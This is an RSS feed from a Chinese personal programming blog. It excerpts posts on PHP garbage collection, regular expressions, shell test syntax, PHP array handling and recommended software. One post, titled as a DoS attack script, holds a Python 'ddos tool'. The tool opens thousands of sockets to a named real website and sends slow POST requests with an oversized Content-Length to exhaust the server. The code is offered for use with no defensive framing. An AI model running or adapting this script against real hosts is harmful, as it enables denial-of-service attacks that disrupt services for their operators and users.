<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on My Site</title>
    <link>https://h-zeus.github.io/posts/</link>
    <description>Recent content in Posts on My Site</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Thu, 23 Apr 2020 00:00:00 +0000</lastBuildDate>
    
	<atom:link href="https://h-zeus.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>PHP垃圾回收机制</title>
      <link>https://h-zeus.github.io/posts/php%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/</link>
      <pubDate>Thu, 23 Apr 2020 00:00:00 +0000</pubDate>
      
      <guid>https://h-zeus.github.io/posts/php%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/</guid>
      <description>原理 利用引用计数refcount
PHP5、PHP7 的不同点  PHP5 标量数据类型会计数，PHP7 标量数据类型不再计数，不需要单独分配内存。 PHP7 的 zval 需要的内存不再是单独从堆上分配，不再自己存储引用计数。 PHP7 的复杂数据类型（比如数组和对象）的引用计数由其自身来存储。  变量在 zval 的变量容器中结构    类型     值   is_ref   refcount     is_ref 是个 bool 值，用来区分变量是否属于引用集合。 refcount 计数器，表示指向这个 zval 变量容器的变量个数。  在 PHP5.3 的GC中，针对垃圾处理做了如下说明：  如果一个 zval 的 refcount 增加，那么此 zval 还在使用，肯定不是垃圾，不会进入缓冲区。 如果一个 zval 的 refcount 减少到 0，那么此 zval 会被立即释放掉，不属于 GC 要处理的垃圾对象，不会进入缓冲区。 如果一个 zval 的 refcount 减少之后大于 0，那么此 zval 还不能被释放，此 zval 可能成为一个垃圾，将其放入缓冲区。  垃圾回收算法  对每个缓冲区中的根 zval 按照深度优先遍历算法遍历所有能遍历到的 zval，并将每个 zval 的 refcount 减 1，同时为了避免对同一 zval 多次减 1（因为可能不同的根能遍历到同一个 zval），每次对某个 zval 减 1 后就对其标记为”已减“。 再次对每个缓冲区中的根 zval 深度优先遍历，如果某个 zval 的 recount 不为 0，则对其加 1，否则保持其为 0.</description>
    </item>
    
    <item>
      <title>正则表达式</title>
      <link>https://h-zeus.github.io/posts/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</link>
      <pubDate>Fri, 17 Apr 2020 00:00:00 +0000</pubDate>
      
      <guid>https://h-zeus.github.io/posts/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</guid>
      <description>常用符号 ^ 匹配输入字符串的开始位置 + 匹配一个或多个字符（至少要有一个） $ 匹配输入字符串的结束位置 * 匹配0个或多个字符串（可以没有，也可以有） ? 最多出现一次 \ 转义 . 除换行之外的任何字符 | 指明两项之间选择一项 /^c/ =&amp;gt; 匹配&amp;#39;c&amp;#39;开头的字符串 /^cm+/ =&amp;gt; 匹配&amp;#39;cm&amp;#39;开头的字符串 /^cm+k$/ =&amp;gt; 匹配&amp;#39;cmk&amp;#39;,&amp;#39;cmmmmk&amp;#39;中间不能有其他字符 /^cm+a+b*k$/ =&amp;gt; 匹配&amp;#39;cmak&amp;#39;, &amp;#39;cmmmaaak&amp;#39;, &amp;#39;cmmmaaaabbbbk&amp;#39;等 /^cma?k$/ =&amp;gt; 匹配&amp;#39;cmak&amp;#39;或&amp;#39;cmk&amp;#39; /^cm\\+k$/ =&amp;gt; 匹配&amp;#39;cm\k&amp;#39;,&amp;#39;cm\\\k&amp;#39;等 /^cm.*k$/ =&amp;gt; 匹配&amp;#39;cm&amp;#39;开头，&amp;#39;k&amp;#39;结尾的字符串 /^cm|hk$/ =&amp;gt; 匹配&amp;#39;cmk&amp;#39;,&amp;#39;chk&amp;#39; 转义字符 \f 匹配一个换页符 \n 匹配换行符 \r 匹配回车符 \s 匹配任何空白字符，如空格，制表符，换页符等 \S 匹配任何非空白字符 \t 匹配制表符 \v 匹配垂直制表符 \d 匹配数字 \D 匹配非数字 \w 匹配下划线在内的任何单词字符：_ A-Z a-z 0-9 \b 匹配字符边界，字符与空格之间的位置 /\b[\w]+\b/ // 匹配出一个单词  表达式  [ ] 中括号表达式，字符集  /^c[0-9]+k$/ =&amp;gt;匹配&#39;c&#39;开头，&#39;k&#39;结尾，中间至少有一个数字的字符串 /^c[0-9A-Z]+k$/ =&amp;gt;匹配&#39;c&#39;开头，&#39;k&#39;结尾，中间至少有一个数字或大写字母的字符串 /^c[0-9A-Za-z_]+k$/ =&amp;gt; 等价于 /^c\w+k$/ /^c[^0-9]+k$/ =&amp;gt; 中括号内的^表示除此集合之外的字符 {} 限定出现次数  /^[0-9]{6}$/ =&amp;gt; 匹配6位数字 /^[0-9]{4,6}$/ =&amp;gt; 匹配4到6位数字 () 子表达式，可以看成一个字符  示例解析 /^(-|\+)?</description>
    </item>
    
    <item>
      <title>Shell 基本语法</title>
      <link>https://h-zeus.github.io/posts/shell-%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</link>
      <pubDate>Mon, 13 Apr 2020 00:00:00 +0000</pubDate>
      
      <guid>https://h-zeus.github.io/posts/shell-%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</guid>
      <description>解析器标识 #!/bin/bash
数值计算 var=$((运算内容))
判断式 test 或 []
测试标志 关于文件的文件类型判断 ­e 该文件是否存在 ­f 该文件是否存在且为文件 ­d 该文件是否存在且为目录 ­b 该文件是否存在且为一个block device设备 ­c 该文件是否存在且为一个character device设备 ­S 该文件是否存在且为一个Socket文件 ­p 该文件是否存在且为一个FIFO(pipe)文件 ­L 该文件是否存在且为一个连接文件 关于文件的权限检测 root对一些文件权限无作用 ­r 检测该文件是否存在且对当前用户具有可读权限 ­w 检测该文件是否存在且对当前用户具有可写权限 ­x 检测该文件是否存在且对当前用户具有可执行权限 ­u 检测该文件是否存在且对当前用户具有SUID权限 ­g 检测该文件是否存在且对当前用户具有SGID权限 ­k 检测该文件是否存在且对当前用户具有Sticky bit权限 ­s 检测该文件是否存在且为“非空白文件” 两个文件的比较 如 test file1 ­nt file2 ­nt newer than 判断文件1是否比文件2新 ­ot older than 判断文件1是否比文件2旧 判断文件1与文件2是否为同一文件，可用在判断hard link的判定上，主要判定两个文件 -ef 判断文件1与文件2是否为同一文件，可用在判断hard link的判定上，主要判定两个文件是否指向同一个inode 关于两个整数之间的判定 test n1 ­eq n2 ­eq 两数值相等 ­ne 两数值不相等 ­gt n1 大于 n2 ­lt n1 小于 n2 ­ge n1大于等于n2 ­le n1小于等于n2 判定字符串的数据 test ­z string 判定字符串是否为0，若string为空字符串，则为true test ­n string 判断字符串是否非0，若string为空字符串，返回false，­n可以省略 test str1=str2 判断str1是否等于str2，相等回传true test str1!</description>
    </item>
    
    <item>
      <title>Dos 攻击脚本</title>
      <link>https://h-zeus.github.io/posts/dos-%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC/</link>
      <pubDate>Wed, 08 Apr 2020 00:00:00 +0000</pubDate>
      
      <guid>https://h-zeus.github.io/posts/dos-%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC/</guid>
      <description>#!/usr/bin/env python import socket import time import threading # Pressure Test,ddos tool # --------------------------- MAX_CONN = 20000 PORT = 80 HOST = &amp;#34;www.baidu.com&amp;#34; PAGE = &amp;#34;/index.php&amp;#34; # --------------------------- buf = (&amp;#34;POST %sHTTP/1.1\r\n&amp;#34; &amp;#34;Host: %s\r\n&amp;#34; &amp;#34;Content-Length: 10000000\r\n&amp;#34; &amp;#34;Cookie: dklkt_dos_test\r\n&amp;#34; &amp;#34;\r\n&amp;#34; % (PAGE, HOST)) socks = [] def conn_thread(): global socks for i in range(0, MAX_CONN): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((HOST, PORT)) s.send(buf.encode()) print(&amp;#34;Send buf OK!,conn=%d\n&amp;#34; % i) socks.append(s) except Exception as ex: print(&amp;#34;Could not connect to server or send error:%s&amp;#34; % ex) time.</description>
    </item>
    
    <item>
      <title>Mac/Windows Soft</title>
      <link>https://h-zeus.github.io/posts/%E8%BD%AF%E4%BB%B6%E6%8E%A8%E8%8D%90/</link>
      <pubDate>Wed, 08 Apr 2020 00:00:00 +0000</pubDate>
      
      <guid>https://h-zeus.github.io/posts/%E8%BD%AF%E4%BB%B6%E6%8E%A8%E8%8D%90/</guid>
      <description>其他  Enpass 密码管理工具 Joplin 笔记软件（搭配坚果云可实现同步功能） 网易云音乐 音乐 WPS Office 办公套件 自动切换输入法 如名 pap.er 壁纸软件 超级右键 还原 Windows 右键菜单 Alfred 4 必备软件 自动化操作 eZip 解压缩软件 iCHM .CHM 查看器 BetterTouchTool 自动化操作 Google Chrome 谷歌浏览器（选择性安装）  编程  Postman 接口测试工具 Navicat Premium 多版本数据库 Hyper 自定义终端 Sublime Text 编辑器（代替文本编辑器） PhpStorm PHP 编辑器 PyCharm Python 编辑器 Xcode 编译编辑器 网易有道词典 翻译软件 VirtualBox 虚拟机（建议安装 Vagrant配合 .box使用） Typora MarkDown编辑器 Charles 抓包工具 MAMP 开发环境集成 SwitchHosts 管理 Hosts diffmerge 文件差异对比  Windows  Camtasia 9 视频剪辑、录屏软件 Fiddler 抓包工具 Adobe Audition 音频编辑软件 冰点文库 各大文库下载 FSCapture 截屏软件  </description>
    </item>
    
    <item>
      <title>PHP获取二维数组中某一列的值集合</title>
      <link>https://h-zeus.github.io/posts/php%E8%8E%B7%E5%8F%96%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E4%B8%AD%E6%9F%90%E4%B8%80%E5%88%97%E7%9A%84%E5%80%BC%E9%9B%86%E5%90%88/</link>
      <pubDate>Wed, 08 Apr 2020 00:00:00 +0000</pubDate>
      
      <guid>https://h-zeus.github.io/posts/php%E8%8E%B7%E5%8F%96%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E4%B8%AD%E6%9F%90%E4%B8%80%E5%88%97%E7%9A%84%E5%80%BC%E9%9B%86%E5%90%88/</guid>
      <description>PHP还是比较常用的，于是我研究了一下PHP二维数组。在处理php数组的时候，有一种需求特别的频繁，如下二维数组：
$arr = array( 1=&amp;gt;array( &amp;#39;id&amp;#39; =&amp;gt; 5, &amp;#39;name&amp;#39; =&amp;gt; &amp;#39;张三&amp;#39; ), 2=&amp;gt;array( &amp;#39;id&amp;#39; =&amp;gt; 6, &amp;#39;name&amp;#39; =&amp;gt; &amp;#39;李四&amp;#39; ) ); 目的就是要取到key为name的集合，得到这个结果：
$arr2 = array( 0=&amp;gt;&amp;#39;张三&amp;#39;, 1=&amp;gt;&amp;#39;李四&amp;#39; ); 这里有几种方法： 1：最简单的，foreach遍历数组：
foreach ($arr as $key =&amp;gt; $value) { $arr2[] = $value[&amp;#39;name&amp;#39;]; } 2：代码量稍微少一点的代码，使用了 array_map 这个php方法：
$arr2 = array_map(&amp;#39;array_shift&amp;#39;,$arr); 意为把$arr数组的每一项值的开头的值移出，并返回被移出的每一项值中被移出的值，注意此时新数组$arr2的键仍是原数组$arr的键
2.1：在方法2的基础上，可以稍微开一下脑洞，如果需要获取的是二维数组的每一项的开头列或结尾列，也可以这样做：
$arr2 = array_map(&amp;#39;reset&amp;#39;,$arr); $arr2 = array_map(&amp;#39;end&amp;#39;,$arr); 3：还可以使用 array_reduce 方法，不过代码略多，不过这个方法的想象空间（针对别的数组取值操作）还是蛮大的：
$arr2 = array_reduce($arr, create_function(&amp;#39;$result, $v&amp;#39;, &amp;#39;$result[] = $v[&amp;#34;name&amp;#34;];return $result;&amp;#39;)); array_reduce方法用回调函数迭代地将对数组的值进行操作，而create_function用于一个匿名方法做回调用，这个匿名方法的参数$result为上一次迭代产生的值，$v是当前的值，内部实现既为获取到数组$arr每一项的”name”的值并push到新$result数组;
4：最后这个终极方法实在是太爽了，一个方法就搞定，而且非常灵活：
$arr2 = array_column($arr, &amp;#39;name&amp;#39;); 第二个参数为想要获取的那一列的键名，是不是很方便呢，不过这个方法有个限制，就是php版本必须 &amp;gt;= 5.</description>
    </item>
    
  </channel>
</rss>